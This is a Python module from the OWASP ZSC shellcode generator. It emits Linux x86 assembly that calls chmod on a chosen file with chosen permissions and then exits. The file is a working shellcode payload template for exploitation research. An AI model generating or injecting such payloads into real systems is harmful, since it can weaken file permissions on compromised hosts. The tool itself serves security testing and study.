#!/usr/bin/env python
'''
OWASP ZSC
https://www.owasp.org/index.php/OWASP_ZSC_Tool_Project
https://github.com/zscproject/OWASP-ZSC
http://api.z3r0d4y.com/
https://groups.google.com/d/forum/owasp-zsc [ owasp-zsc[at]googlegroups[dot]com ]
'''
from core import stack


def chmod(file, perm_num):
    return '''
xor    %%eax,%%eax
push   %%eax
%s
mov    %%esp,%%edx
%s
push   %%edx
push   $0xf
pop    %%eax
push   $0x2a
int    $0x80
mov    $0x01,%%al
mov    $0x01,%%bl
int    $0x80
''' % (file, perm_num)


def run(data):
    file_to_perm, perm_num = data[0], data[1]
    return chmod(
        stack.generate(file_to_perm, '%ebx', 'string'),
        stack.generate(perm_num, '%ecx', 'int'))
